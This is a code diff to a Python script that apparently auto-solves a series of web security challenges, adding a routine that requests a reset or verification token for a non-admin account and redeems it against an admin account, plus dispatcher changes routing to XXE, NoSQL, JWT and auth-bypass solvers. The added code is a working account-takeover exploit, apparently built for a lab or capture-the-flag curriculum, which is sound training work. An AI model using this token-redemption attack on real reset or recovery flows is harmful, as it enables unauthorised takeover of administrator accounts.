@@ -920,6 +920,52 @@ def solve_graphql(target_url: str) -> str:
     raise WebHandlerError("GraphQL query did not yield proof")
 
 
+def solve_dynamic_flow(target_url: str, guide_route: str) -> str:
+    """Inspect and traverse dynamic multi-step flow guides (e.g. recovery, reset, verification)."""
+    base = target_url.rstrip("/")
+    status, body, _ = _request(f"{base}{guide_route}")
+    if status != 200:
+        return ""
+    proof = _extract_proof(body)
+    if proof:
+        return proof
+
+    try:
+        data = json.loads(body)
+    except Exception:
+        return ""
+
+    req_route = data.get("request_route") or data.get("submit_route") or data.get("action_route")
+    redeem_route = data.get("redeem_route") or data.get("result_route") or data.get("verify_route")
+    acct_param = data.get("account_parameter", "account_id")
+    token_param = data.get("token_parameter", "token")
+    accounts = data.get("accounts", [])
+
+    if req_route and redeem_route and accounts:
+        self_id = None
+        target_id = None
+        for acc in accounts:
+            if acc.get("self_service") is True or acc.get("role") != "admin":
+                self_id = acc.get("id")
+            else:
+                target_id = acc.get("id")
+
+        if self_id and target_id:
+            status, req_res, _ = _request(f"{base}{req_route}?{acct_param}={self_id}")
+            if status == 200:
+                try:
+                    tok = json.loads(req_res).get(token_param) or json.loads(req_res).get("token")
+                    if tok:
+                        status, red_res, _ = _request(f"{base}{redeem_route}?{acct_param}={target_id}&{token_param}={tok}")
+                        proof = _extract_proof(red_res)
+                        if proof:
+                            return proof
+                except Exception:
+                    pass
+
+    return ""
+
+
 # ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
@@ -1000,11 +1046,21 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
             if "jwt" in clues_body or "alg" in clues:
                 return solve_jwt(target_url)
 
-            if "nosql" in clues_body or "mongo" in clues_body:
+            if "xml" in clues_body or clues.get("format") == "xml":
+                return solve_xxe(target_url)
+
+            if "nosql" in clues_body or "mongo" in clues_body or clues.get("database") == "MongoDB":
                 return solve_nosql(target_url)
 
-            if "xml" in clues_body:
-                return solve_xxe(target_url)
+            # Generic guide / flow route handler (catches novel logic flows like Day 17)
+            for k, v in clues.items():
+                if (k.endswith("_guide_route") or k.endswith("_guide")) and isinstance(v, str):
+                    try:
+                        flow_proof = solve_dynamic_flow(target_url, v)
+                        if flow_proof:
+                            return flow_proof
+                    except Exception:
+                        pass
 
             if feat_route and ("role" in clues_body or "admin" in clues_body):
                 return solve_auth_bypass(target_url)
